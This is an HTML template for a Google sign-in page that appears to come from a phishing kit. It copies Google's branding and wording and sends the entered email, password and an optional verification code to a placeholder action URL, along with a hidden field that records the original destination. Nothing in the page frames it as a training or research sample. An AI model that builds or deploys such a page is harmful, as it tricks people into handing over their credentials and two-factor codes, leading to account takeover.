<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: Roboto, "Segoe UI", Helvetica, Arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { border: 1px solid #dadce0; border-radius: 8px; width: 448px; max-width: 100%; padding: 48px 40px 36px; }
  .logo { font-size: 24px; font-weight: 500; letter-spacing: -.5px; }
  .logo .g1 { color: #4285f4; } .logo .o1 { color: #ea4335; } .logo .o2 { color: #fbbc05; }
  .logo .g2 { color: #4285f4; } .logo .l1 { color: #34a853; } .logo .e1 { color: #ea4335; }
  h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 16px 0 0; }
  .sub { color: #202124; font-size: 16px; margin: 8px 0 32px; }
  form { text-align: left; }
  .field { position: relative; margin-bottom: 8px; }
  input { width: 100%; padding: 13px 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
  input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.25); }
  .links { display: flex; justify-content: space-between; font-size: 14px; margin: 8px 0 40px; }
  .links a { color: #1a73e8; font-weight: 500; text-decoration: none; }
  .links a:hover { background: #f8faff; }
  .bottom { text-align: right; }
  button { padding: 10px 24px; border: 0; border-radius: 4px; background: #1a73e8; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; }
  button:hover { background: #1765cc; }
  .foot { text-align: center; color: #5f6368; font-size: 14px; margin-top: 32px; }
</style>
</head>
<body>
<div class="card">
  <div class="logo"><span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l1">l</span><span class="e1">e</span></div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    <input type="text" name="username" placeholder="Email or phone" required autofocus>
    {{if .ShowOTP}}<input type="text" name="otp" placeholder="Enter verification code" inputmode="numeric">{{end}}
    <input type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
    <div class="links">
      <a href="#">Forgot email?</a>
      <a href="#">Create account</a>
    </div>
    <div class="bottom">
      <button type="submit">Next</button>
    </div>
  </form>
  <div class="foot">One account. All of Google working together.</div>
</div>
</body>
</html>
